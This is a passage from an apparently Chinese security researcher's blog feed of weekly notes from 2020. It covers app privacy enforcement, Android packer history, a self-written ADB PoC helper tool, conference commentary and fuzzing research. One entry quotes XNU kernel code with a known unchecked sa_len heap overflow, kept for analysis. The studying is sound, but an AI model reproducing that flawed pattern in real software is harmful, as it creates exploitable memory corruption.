&lt;p&gt;我觉得近两年国家对网络安全的重视程度远超从前，隔三差五就是挂一堆违规产品名单出来，该负责的部门和人愿意有所为，是件好事&lt;/p&gt;

&lt;p&gt;《工信部通报101款侵害用户权益行为APP》：今年第四批了，总有那么些业务线说了不听，非要人家给你挂出来才跟个孙子一样到处求爷爷告奶奶找人问怎么办，国内这些APP，有一个算一个，拿了这么多权限，收集了那么多数据，你真的用上了吗？还不是躺在数据库里吃灰&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/E0oyxKlvoutqM_MEfpaaUQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《北京管局启动APP数据安全检测专项行动》：最近APP的数据安全治理工作开始行动起来了，走过路过都看看，该做的趁早就做了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/fsATZMeisYt-1WsHSCET6A&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下面是俩通知，各位，可以积极为国家做贡献了&lt;/p&gt;

&lt;p&gt;《关于征集《信息安全技术 移动互联网应用程序（APP）SDK安全指南》标准参编单位的通知》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/7RG0zHUFfoCfq0hXOcK51A&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《关于征集《信息安全技术 移动互联网应用程序（APP）个人信息安全测评规范》标准参编单位的通知》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/-LwxbkZ_FKo3G_Hwn2E1JQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;人一胖就容易出现各种奇奇怪怪的问题，我睡觉的时候时不时就会憋醒，醒来后就会出现憋气后的大喘气，做了个检查，结论是轻度阻塞性睡眠呼吸暂停低通气综合征，过几天约一下报告上指定的教授看一下，估计还是减肥的事，以前血压高那医生也跟我说要减肥，不然问题大得很&lt;/p&gt;

&lt;p&gt;这个检查的设备很有意思，一个小盒子，上面接着三根管子，两根气管，一根是血氧夹，睡觉的时候把小盒子绑在肚皮上，然后两根气管就像医院ICU那样挂在鼻子上，测一晚上就行&lt;/p&gt;

&lt;p&gt;本周开心事儿，暗泉信息还注意到我了，是不是爬虫自动化发的？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5DA81449BE9331A5EBA9CE04947F94EB.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上次说的月初去上海休假还没去，工作上的事情耽误了&lt;/p&gt;

&lt;p&gt;运气不好的话得16号了，运气好的话，11号就可以去，美滋滋&lt;/p&gt;

&lt;p&gt;秋天到了，该回浙江吃海鲜啦&lt;/p&gt;

&lt;p&gt;周末愉快~&lt;/p&gt;
</description>
                <pubDate>Fri, 04 Sep 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/09/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.04.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/09/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.04.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.08.21 偷懒一周，内空</title>
                <description>&lt;p&gt;我这周翻了翻奇安信的安全创客汇，想找找灵感，发现2017年有一个移动安全的项目&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B00A16B10BE64F27B859518C6F9D25D8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2017年那会加固是一个白热化的时代，大家都在研究第四代壳，也就是广义上的VMP&lt;/p&gt;

&lt;p&gt;第几代壳的定义大家可能有不同的理解，我这里简单讲讲&lt;/p&gt;

&lt;p&gt;第一代壳的特征是隐藏主Dex，通过动态运行以插件的形式进行调用&lt;/p&gt;

&lt;p&gt;第二代壳开始就开始有掉队的厂商了，像娜迦这种跑得快的，他们研发的第一代壳就是某些厂商的第二代壳，第二代壳的特征是代码抽取，比如阿里有一年的移动安全挑战赛，其中有一题就是使用的代码抽取，动态跑起来之后，可以看到其指令都存在于另一块内存里&lt;/p&gt;

&lt;p&gt;第三代壳的特征是So加固，比如OLLVM混淆，同时伴随Dex指令动态解密，运行时才解密&lt;/p&gt;

&lt;p&gt;第四代壳的特征是VMP，不过这里的VMP我并非很认可，更像是一个粗糙的代码映射，2017年之后我没有再跟进加固技术，不知道发展的怎么样了，这里不过多评价&lt;/p&gt;

&lt;p&gt;整个加固技术的发展就是如上所述&lt;/p&gt;

&lt;p&gt;客户也不全是不懂技术，人家也是会多方打听的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/337EF8D99F78678C00D52DA1E849402A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Electron框架写的东西我见过好几个RCE了，这里有一个安全汇总也是挺好的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/doyensec/awesome-electronjs-hacking&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Qmage MMS RCE到这里应该是完结了，很强！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/googleprojectzero/SkCodecFuzzer/tree/master/mms_exploit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hacker101 CTF里的Android题目我认为出的很好&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/bugbountywriteup/hacker101-ctf-android-challenge-writeups-f830a382c3ce&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;常见国内的Android题目一般就三种&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;简单Java层注册算法分析，无混淆&lt;/li&gt;
  &lt;li&gt;复杂Native层注册算法分析，有强混淆&lt;/li&gt;
  &lt;li&gt;极少数利用Apk特性&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;总结一下就是：绝大部分偏逆向能力&lt;/p&gt;

&lt;p&gt;2017年的时候，阿里出过一次移动安全挑战赛，那一次挑战赛从本质上来说，属于Real World CTF，比如声纹破解，攻破了这道题就等于把阿里的声纹防御机制攻破，这种赛题没啥意思&lt;/p&gt;

&lt;p&gt;换句话来说，这就是另一种形式的众测&lt;/p&gt;

&lt;p&gt;我发现了一个神器，很多次我想推出我的移动硬盘，总是显示被占用，这个工具可以看到是哪个进程在占用移动硬盘&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.hamsoftengineering.com/products/wkm/wkm.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下周或者下下周准备休一星期假，目的地上海，所以提前跟两百四十八位读者朋友们说一声，本月不会有新文章了&lt;/p&gt;
</description>
                <pubDate>Fri, 21 Aug 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/08/21/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.21.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/08/21/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.21.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.08.14 开源一个工具</title>
                <description>&lt;p&gt;饱受手动输入命令行的折磨，于是我整了一个东西&lt;/p&gt;

&lt;p&gt;第一个Alpha版本已经开源，大佬们赏一些星星&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/Toolgy&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;贴心的打包成了dmg，欢迎大家下载，内置Python库&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/Toolgy/releases/download/v0.1-alpha/AndroidToolgy-v0.1-alpha.dmg&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;简单讲讲这个工具怎么用&lt;/p&gt;

&lt;p&gt;运行起来之后，你会看到这个界面&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1EF60AA407F019C5D3D59420CFDD0BB2.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们来配置ADB路径，这个是必须要配置的，配置的入口在菜单栏的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Config-&amp;gt;Adb Path&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;输入的路径类似&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/wnagzihxa1n/Library/Android/android-sdk-macosx/platform-tools&lt;/code&gt;，输入完成后，点击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OK&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AEF4C60B1DF09C697AA593574876DC85.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;回到主界面，我们点击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Refresh Device List&lt;/code&gt;，就可以看到设备已经成功识别了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EB63B0E3D8C4F9E97F41BDDBB2E1A9CF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以任意切换系统应用和第三方应用，用安装路径来识别的，并不是很准确，有一些第三方的系统会把定制的应用安装在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/data/&lt;/code&gt;下&lt;/p&gt;

&lt;p&gt;这个工具我的初衷是用来在安卓应用逻辑漏洞挖掘中快速生成Poc的&lt;/p&gt;

&lt;p&gt;举个例子，我点击一个应用，然后点击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start Activity&lt;/code&gt;，它会帮我生成一条命令，并且带上参数说明&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/11B6AFDC92E0A086F466CAED22DE98E0.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;妈耶，这就解决了我每次都记不住命令和参数的尴尬！&lt;/p&gt;

&lt;p&gt;另外两个按钮也是一样的&lt;/p&gt;

&lt;p&gt;第一个文本框用于提示命令行参数以及使用示例&lt;/p&gt;

&lt;p&gt;我们看到中间的命令框，它是可编辑的，毕竟有限的情况下我没法拿到内部的组件名，后台逆向分析太耗时间，不符合我的美学观点，所以这个应用需要配合类似JEB这样的工具使用，当审计到一个导出组件之后，我们分析出逻辑，那么快速生成一条命令测试，妥妥的&lt;/p&gt;

&lt;p&gt;最下面的文本框是命令执行输出，注意，千万不要执行ping之类需要手动结束的命令&lt;/p&gt;

&lt;p&gt;这就是我写这个工具最初的目的，然后我想了想，这个工具就是为了省时间查命令的，所以又加了一些我常用又记不住的&lt;/p&gt;

&lt;p&gt;Frida和Xposed就是基本的脚本框架，生成之后直接开始编辑，然后运行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DCC37F79CB30FA139C7CDDB18C1443CE.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Device里面我加了一些常见的ADB功能，v0.2-Alpha会加入端口转发和设置调试，一键运行，还是挺巴适的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F64596C0BD8ADF209F04E6558DFFC22C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后的Poc是我用来写一些复杂的逻辑漏洞代码的，在命令行写不了，比如带有序列化的数据或者是自定义类，这就只能把代码写到APP了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B3C9916332E1D77BB0CB2E31631661CE.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;整体就是这样了，有问题随时开Issue，我不一定会改，因为我搞逆向就是不喜欢被产品经理吆五喝六告诉我要这样写要那样写，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;对了，这个工具是针对macOS的，我写的这一系列都是因为macOS平台没有趁手的工具&lt;/p&gt;

&lt;p&gt;然后讲讲这周的一些安全资料&lt;/p&gt;

&lt;p&gt;龚师傅关于梯云纵漏洞链的分析视频已经公开&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://isc.360.com/2020/detail.html?id=18&amp;amp;vid=112&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三星Find My Mobile应用多个漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://char49.com/tech-reports/fmmx1-report.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这让我想起了当年三星S8也是因为一个全局读写的调试文件相关代码没删结果被大佬们吊起来打&lt;/p&gt;

&lt;p&gt;接下来还有俩工具要写，接着干！&lt;/p&gt;

&lt;p&gt;今儿有一个论文分享《FANS: Fuzzing Android Native System Servicesvia Automated Interface Analysis》，菜栏提了好几遍的东西了，挺好的一个研究，360 Alpha Team很棒！&lt;/p&gt;

&lt;p&gt;我现在每周五发的东西比去年少了不少，其实是心态变化，堆一大堆资料看起来很厉害，仔细想想挺没劲的，还是实实在在的讲一些自己的想法，对漏洞的理解有趣的多&lt;/p&gt;

&lt;p&gt;我现在也不太看玄武的推送了，以前每天必看，现在更多就是看看推上面大佬们转的多的和GitHub上面小星星点的多的，够用&lt;/p&gt;

&lt;p&gt;啥玩意儿都看，不累吗？&lt;/p&gt;

&lt;p&gt;最后打个广告，我那个安卓应用安全404已经放了《1.常见配置型漏洞 - 程序任意备份》和《2.组件导出漏洞 - Intent拒绝服务》，内容详细，资料齐全&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/APP-SECURITY-404&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;到钟了，就到这吧&lt;/p&gt;
</description>
                <pubDate>Fri, 14 Aug 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/08/14/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.14.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/08/14/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.14.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.08.07 今年数字举办的ISC有进步</title>
                <description>&lt;p&gt;数字和奇安信现在这关系，真是让人头秃，厂商更头秃吧&lt;/p&gt;

&lt;p&gt;从某些角度上来说，我应该站数字，但是今年数字都没有给我发邀请函，再一次证明了我是一个不入眼的小弟弟，多年老员工比不上那些天天在娱乐群里吹牛逼的，害&lt;/p&gt;

&lt;p&gt;坊间传言，以前奇安信还没被老周扫地出门的时候，ISC是数字出钱，奇安信主办&lt;/p&gt;

&lt;p&gt;后来奇安信被老周扫地出门，带走了大把拥有丰富大会举办经验的同学，直接导致2019年的ISC抓瞎，不仅国家会议中心这个雷打不动的场子没订到，连议程啥的都准备的匆匆忙忙&lt;/p&gt;

&lt;p&gt;前几天我还吐槽，官网啥都没有，结果上线当天直接换了个主页&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/174DB1BF996A2906D34087D8D79AC470.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;是我错怪你了&lt;/p&gt;

&lt;p&gt;不过我依旧不能理解一点，为什么奇安信能大大方方的把议程都放出来，而数字遮遮掩掩的，这么不自信吗？&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;龚师傅无敌！太强了！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7FEC3028A5970F171BA4A226E99AB391.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Slides已经放出&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3C7B15FFAADCF132CE20E5E7DF519DE5.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;今年BlackHat的Mobile感觉都很值得学习一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/ECF3482DA28861BF242B63196EA99301.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我平时在Github上面经常能发现一些很有趣的项目，开发者都是一些在校生或者刚毕业进入安全公司的小伙小妹，这些人里面肯定会出现一波成长迅速的力量，ISC如果能在会前弄个报名参展的活动，然后海报和限量版专属参展证书或者勋章加持，把仪式感搞起来，提前拉拢一拨有潜力的人，以后才不至于被对门吊打&lt;/p&gt;

&lt;p&gt;GOSSIP的论文推荐真是棒棒的，现在同步到了GitHub一份&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/GoSSIP-SJTU/dailyPaper/tree/master/G.O.S.S.I.P%20%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E6%8E%A8%E8%8D%90%202020&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;盘古发的一篇关于XNU内核&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sockaddr&lt;/code&gt;的安全性分析，我喜欢他们举一反三的能力&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.pangu.io/?p=195&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作者首先以PJ0的Ian Beer发现的一个漏洞为例，讲解了这种漏洞的模型，代码只检查了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_INET&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_INET6&lt;/code&gt;两种情况下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dst-&amp;gt;sa_len&lt;/code&gt;长度，但是没有检查除这两种类型之外的情况，所以如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dst-&amp;gt;sa_family&lt;/code&gt;设定为这两种情况之外的数据，就会造成一个堆溢出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// verify sa_len for AF_INET:
if (dst-&amp;gt;sa_family == AF_INET &amp;amp;&amp;amp; dst-&amp;gt;sa_len != sizeof(mpte-&amp;gt;__mpte_dst_v4)) {
    mptcplog((LOG_ERR, &quot;%s IPv4 dst len %u\n&quot;, __func__, dst-&amp;gt;sa_len), MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
    error = EINVAL;
    goto out;
}

// verify sa_len for AF_INET6:
if (dst-&amp;gt;sa_family == AF_INET6 &amp;amp;&amp;amp; dst-&amp;gt;sa_len != sizeof(mpte-&amp;gt;__mpte_dst_v6)) {
    mptcplog((LOG_ERR, &quot;%s IPv6 dst len %u\n&quot;, __func__, dst-&amp;gt;sa_len), MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
    error = EINVAL;
    goto out;
}

// code doesn't bail if sa_family was neither AF_INET nor AF_INET6
if (!(mpte-&amp;gt;mpte_flags &amp;amp; MPTE_SVCTYPE_CHECKED)) {
    if (mptcp_entitlement_check(mp_so) &amp;lt; 0) {
        error = EPERM;
        goto out;
    }

    mpte-&amp;gt;mpte_flags |= MPTE_SVCTYPE_CHECKED;
}

// memcpy with sa_len up to 255:
if ((mp_so-&amp;gt;so_state &amp;amp; (SS_ISCONNECTED|SS_ISCONNECTING)) == 0) {
    // 当sa_family为非AF_INET和AF_INET6时，没有对sa_len进行长度校验，所以sa_len可以最大为0xff，导致堆溢出
    memcpy(&amp;amp;mpte-&amp;gt;mpte_dst, dst, dst-&amp;gt;sa_len);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一直想搞的Fuzzer没有眉目，有点头秃，最近该找师傅们聊聊天了&lt;/p&gt;

&lt;p&gt;可以关掉文章了，以下都是我个人吐槽&lt;/p&gt;

&lt;p&gt;上周看了一篇特别有感触的文章&lt;/p&gt;

&lt;p&gt;《阿里正式取消周报：打击低效加班，拒绝形式主义！》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/U_kLm4AxTLuVNZ7gFqc3hw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;搞安全技术研究的读者我相信都特别有感触，一个月都不敢保证有产出&lt;/p&gt;

&lt;p&gt;周一到周五总共就五天，五天时间搞业务还好说，比如搞开发，不管怎么写代码，肯定都会有进度的，功能没实现再不济都可以说遇到了技术难点&lt;/p&gt;

&lt;p&gt;所以我最喜欢的工作就是写工具，拉几个人讨论个项目，然后散会就开始做，一周下来周报妥妥的&lt;/p&gt;

&lt;p&gt;以前有近一年的时间，我在搞业务安全的同时需要搞技术研究，真的心力交瘁，每周五要写周报，我总不能写这周看了几篇技术文章，调试了几个漏洞，于是每周前三天我研究技术，后两天就需要搞一些能写周报的工作&lt;/p&gt;

&lt;p&gt;之前跟楼上几位搞研究的大佬们聊天，都透露出了搞研究的心酸，有产出就是棒棒，没有产出就是凉凉&lt;/p&gt;

&lt;p&gt;不少搞技术研究的朋友都转行去搞业务安全了，好在我一直都是业务安全&lt;/p&gt;

&lt;p&gt;这篇文章里面有一句话：汇报的时候精神抖擞，落实的时候毫无进展&lt;/p&gt;

&lt;p&gt;结合我目前接触到的社群和产品来看，都是一样的&lt;/p&gt;

&lt;p&gt;有的人写一本书，封面各种高大上，书籍内容渣的不行&lt;/p&gt;

&lt;p&gt;有的公司PPT吹的天花乱坠，解决各种痛点，获得各种国际奖项，真的问一些技术上的问题，只会推脱下次交流，所以我现在都不想去开产品交流会，一坐两小时&lt;/p&gt;
</description>
                <pubDate>Fri, 07 Aug 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/08/07/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.07.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/08/07/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.07.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.08.04 墙裂推荐浙大系统安全暑期课</title>
                <description>&lt;p&gt;这一周的浙江大学系统安全暑期课真是棒棒的，邀请的老师都很强！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/MVurIkNoUrvKA4_Tgm-OQw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我听了一部分，尤其是周一下午新加坡南洋理工的刘教授分享的实验室一些技术研究，记忆深刻！&lt;/p&gt;

&lt;p&gt;大家有兴趣可以看看这位教授的主页，整个分享过程逻辑清晰，信息量极大，希望在不久的将来能有一篇Paper合作，或者五到十篇&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.ntu.edu.sg/home/yangliu/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我之前搞浏览器读过他们实验室一篇Paper《Superion: Grammar-Aware Greybox Fuzzing》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://arxiv.org/abs/1812.01197v3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;JS引擎的模糊测试有一个重要的点就是如何变异测试文件，使其生成的代码能通过JS引擎的语法检查，语法检查都不通过，生成的测试文件对于模糊测试来说大概率是无效的&lt;/p&gt;

&lt;p&gt;为什么说是大概率无效呢？&lt;/p&gt;

&lt;p&gt;因为在语法检查阶段也有可能会击中语法检查模块的漏洞，比如下面这篇文章就讲解了如何在Parser模块中挖掘漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mtowalski.github.io/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这篇Paper主要思路是生成大量JS代码的语法树节点片段，然后利用这些语法树节点片段去做测试文件的语法树节点替换，从而生成新的测试文件，这样生成的测试文件通过JS引擎语法检查的概率大大提高&lt;/p&gt;

&lt;p&gt;来个图理解一下，通过这种基于语法树节点的替换思路，可以生成大量符合语法检查的测试文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B9B7DDAEA726CF496AC805824B4A7130.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个项目开源，有兴趣的同学可以尝试跑跑&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/zhunki/Superion&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;产出也是非常不错的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CAB13BD4C14063A9DDEC677A37AF7A94.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我曾经尝试跑过这个项目，后来因为某些原因，转战到了Fuzzilli&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/googleprojectzero/fuzzilli&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近出现了一个我上个月一直在构思的一个东西，妈耶，就这样被抢先了？？？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/688511E6569C68699D887B3EFC4DC1E7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以后有想法赶紧先做了！！！&lt;/p&gt;

&lt;p&gt;好了想法来了，逻辑型的漏洞，从市场上的漏洞报告来看，目前公开是没什么人做的&lt;/p&gt;

&lt;p&gt;Firefox修复了一个Content Provider任意文件访问的漏洞，定级Critical&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.mozilla.org/en-US/security/advisories/mfsa2020-27/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从如下描述来看，想定位到这个漏洞问题不大&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C1E415F4DFF9D723FAD77929ED566D25.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;等我复现完单独写一篇分析，顺带讲讲如何自动化的筛选APK里同类型的攻击点，我还没开始分析，可能会被打脸&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CA90EDF6395BED023394EE104C770547.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ISC，曾经我心中神之向往的一个安全会议&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://isc.360.com/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;明天就开幕了，至今官网啥都没有&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C317342ABAE69FF5472369A8C7EF02C5.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;奇安信的北京网络安全大会过两天也开幕了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bcs.qianxin.com/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;反观奇安信搞的会议，各种议程安排的明明白白&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/70400B7816E6B66266034A5E1E83236F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;数字的同学们，知道跟人家的差距了吗？&lt;/p&gt;

&lt;p&gt;如果说满分是一百分，奇安信可以给九十分，数字我只能给四十分&lt;/p&gt;

&lt;p&gt;加油吧&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;我一直以来都没什么可以拿出来吹的东西，这个菜栏全靠各位大佬抬爱才没长草&lt;/p&gt;

&lt;p&gt;我要开始弄一套关于Android应用安全的系列教程文章，跟书的形式不一样，类似一套实践课程，每一篇讲一些知识点，有配套的APK可以对照着实践，具体多少篇我也没想好&lt;/p&gt;

&lt;p&gt;出一套教程是基调，我想加入一些仪式感，把它认真维护下去，以后别人一看到我的ID，”原来你是xxx的作者，久仰！“，就是要这个Feel！&lt;/p&gt;

&lt;p&gt;欢迎大家Star呀~&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/APP-REVERSE-404&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后一件事，我不是很懂ZOOM现在是什么意思，那么多线上安全会议咋办，所以真的要，走出去？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DBCE8BFD4FBD48501858F56609A45A7F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Tue, 04 Aug 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/08/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.04.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/08/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.08.04.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.31 大佬们的专利</title>
                <description>&lt;p&gt;我的博客代码被送到北极保存了，妈耶！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DC01F40842602465E5DB8991DBC13E3F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

